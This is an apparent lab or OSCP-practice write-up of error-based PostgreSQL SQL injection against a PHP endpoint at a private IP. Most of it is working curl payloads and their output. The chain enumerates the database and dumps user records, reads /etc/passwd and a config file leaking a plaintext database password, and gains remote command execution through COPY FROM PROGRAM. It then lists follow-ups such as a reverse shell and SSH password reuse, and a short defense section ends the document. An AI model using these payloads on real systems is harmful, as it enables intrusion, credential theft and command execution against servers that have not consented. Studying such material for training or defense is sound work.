# PostgreSQL Error-Based SQLi Enumeration
**Target**: 192.168.145.49
**Vulnerability**: Error-based SQL Injection in POST parameter `height`
**Endpoint**: http://192.168.145.49/class.php

---

## 🔍 Initial Discovery

### Vulnerability Identification
**Tool**: crack-sqli (custom scanner)
```bash
crack-sqli http://192.168.145.49/class.php \
  -m POST \
  -d "weight=75&height=12&age=25&gender=male&email=test@test.com" \
  -v --quick -n 1
```

**Results**:
- `height` parameter: 90% confidence (PostgreSQL error-based)
- `weight` parameter: 75% confidence (generic error-based)

**Error Signature**:
```
<b>Warning</b>:  pg_query(): Query failed: ERROR:  unterminated quoted string at or near "'"...
```

---

## 🗄️ Database Enumeration

### 1. PostgreSQL Version
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT version()) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**:
```
PostgreSQL 13.7 (Debian 13.7-0+deb11u1) on x86_64-pc-linux-gnu,
compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit
```

---

### 2. Current Database User
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT current_user) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: `rubben`

---

### 3. Current Database Name
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT current_database()) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: `glovedb`

---

### 4. Superuser Privilege Check
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT CASE WHEN usesuper THEN 'superuser' ELSE 'not_superuser' END FROM pg_user WHERE usename=current_user) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: `superuser` ✅ **CRITICAL FINDING**

---

### 5. All Databases
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT string_agg(datname,',') FROM pg_database) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: `postgres, template1, template0, glovedb`

---

### 6. Tables in Public Schema
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: `users` (only 1 table)

---

### 7. Columns in `users` Table
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users') AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: `weight, height, created_at, active, gender, email`

**Note**: No username/password columns present

---

### 8. User Record Count
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT 'Count: ' || COUNT(*)::text FROM users) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: `Count: 4`

---

### 9. All User Records (Single Query)
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT string_agg(weight::text || ',' || height::text || ',' || gender || ',' || email || ',' || active::text || ',' || created_at::text, ' | ') FROM users) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**:
```
1. weight: 40, height: 64, gender: male, email: skrill@lab.lab, active: yes, created: 2022-06-20 13:08:41.095354
2. weight: 34, height: 322, gender: male, email: Selena@lab.lab, active: no, created: 2022-06-20 13:49:59.408325
3. weight: 54, height: 234, gender: male, email: steve@lab.lab, active: yes, created: 2022-06-20 13:50:08.404948
4. weight: 40, height: 342, gender: male, email: dave@lab.lab, active: no, created: 2022-06-20 13:50:16.481982
```

---

## 📁 File System Enumeration

### 10. File Read Capability Test
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',0,200)) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: ✅ Successful file read
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
```

---

### 11. Database Credentials Extraction
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/var/www/html/dbcon.php',0,500)) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: ✅ **CREDENTIALS FOUND**
```php
<?php
   $host        = "host = 127.0.0.1";
   $port        = "port = 5432";
   $dbname      = "dbname = glovedb";
   $credentials = "user = rubben password=avrillavigne";
?>
```

**Credentials**:
- Username: `rubben`
- Password: `avrillavigne`

---

### 12. Full /etc/passwd Enumeration
**Commands** (multiple offsets):
```bash
# Offset 0-2000
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',0,2000)) AS int)--&age=25&gender=male&email=test@test.com"

# Offset 1000-2000
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',1000,2000)) AS int)--&age=25&gender=male&email=test@test.com"
```

**Users with bash shells**:
```
root:x:0:0:root:/root:/bin/bash
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

**System Users**:
```
systemd-network:x:102:103
systemd-resolve:x:103:104
messagebus:x:104:110
sshd:x:105:65534
systemd-coredump:x:999:999
```

---

## 💻 Remote Code Execution (RCE)

### 13. RCE via COPY FROM PROGRAM
**Technique**: PostgreSQL `COPY FROM PROGRAM` (requires superuser)

**Test Command** (`id`):
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'id'; SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output LIMIT 1) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: ✅ **RCE ACHIEVED**
```
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
```

---

### 14. Command Execution Verification
**Command** (`whoami`):
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'whoami'; SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output LIMIT 1) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: `postgres`

---

### 15. Network Configuration
**Command** (`hostname -I`):
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'hostname -I'; SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output LIMIT 1) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: `192.168.145.49`

---

### 16. Sudo Privileges Check
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'sudo -l 2>&1'; SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**: ❌ Failed (exit code 1) - No sudo privileges without password

---

### 17. Postgres Home Directory
**Command** (`ls -la /var/lib/postgresql`):
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'ls -la /var/lib/postgresql'; SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**:
```
total 12
drwxr-xr-x  3 postgres postgres 4096 Jul 18  2022 .
drwxr-xr-x 27 root     root     4096 Jul 18  2022 ..
drwxr-xr-x  3 postgres postgres 4096 Jul 18  2022 13
```

---

### 18. SUID Binary Enumeration
**Command**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'find / -perm -4000 -type f 2>/dev/null | head -20'; SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result**:
```
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

**Note**: Standard SUID binaries, no unusual findings

---

## 🎯 Attack Surface Summary

### Confirmed Capabilities:
1. ✅ **Error-based SQLi** - PostgreSQL injection in `height` parameter
2. ✅ **Database superuser** - `rubben` has full PostgreSQL privileges
3. ✅ **File read** - `pg_read_file()` function accessible
4. ✅ **Remote code execution** - `COPY FROM PROGRAM` works
5. ✅ **Credential disclosure** - Found DB password: `avrillavigne`

### Current Access:
- **User**: `postgres` (uid=106)
- **Groups**: `postgres`, `ssl-cert`
- **Shell access**: Via SQLi RCE (not interactive)

### Potential Next Steps:
1. Establish reverse shell as `postgres` user
2. Test password reuse for SSH (`rubben:avrillavigne`)
3. Enumerate for privilege escalation vectors
4. Check for exploitable services/cron jobs
5. Investigate web application for additional vulnerabilities

---

## 📝 Key Techniques Used

### Manual SQLi Discovery
**Why manual over automated?**
- Understand injection context (string vs numeric)
- Identify database type from error messages
- Learn how to craft payloads without tools

**Error-based extraction pattern**:
```sql
1' AND 1=CAST((SELECT <data>) AS int)--
```
- Forces type conversion error
- Error message contains the extracted data
- Works when no output is reflected in page

### PostgreSQL-Specific Functions:
- `version()` - Database version
- `current_user` - Database username
- `current_database()` - Database name
- `pg_read_file(path, offset, length)` - File read
- `COPY FROM PROGRAM 'cmd'` - Command execution
- `string_agg(column, delimiter)` - Concatenate rows

### Multi-row Extraction:
Instead of iterating with LIMIT/OFFSET:
```sql
SELECT string_agg(column1 || ',' || column2, ' | ') FROM table
```
Extracts all records in single query!

---

## ⏱️ Time Estimates (OSCP Exam Context)

- Initial SQLi identification: 5-10 min (with automated scanner)
- Manual SQLi verification: 5 min
- Database enumeration: 15-20 min
- File read testing: 5 min
- RCE achievement: 10 min
- **Total enumeration phase**: ~45-60 minutes

---

## 🛡️ Defense Recommendations

1. **Parameterized queries** - Use prepared statements
2. **Input validation** - Whitelist/sanitize all POST data
3. **Least privilege** - Don't use superuser for web app DB connections
4. **Error handling** - Suppress verbose PostgreSQL errors in production
5. **WAF/IDS** - Detect common SQLi patterns
6. **Code review** - Audit all database query construction
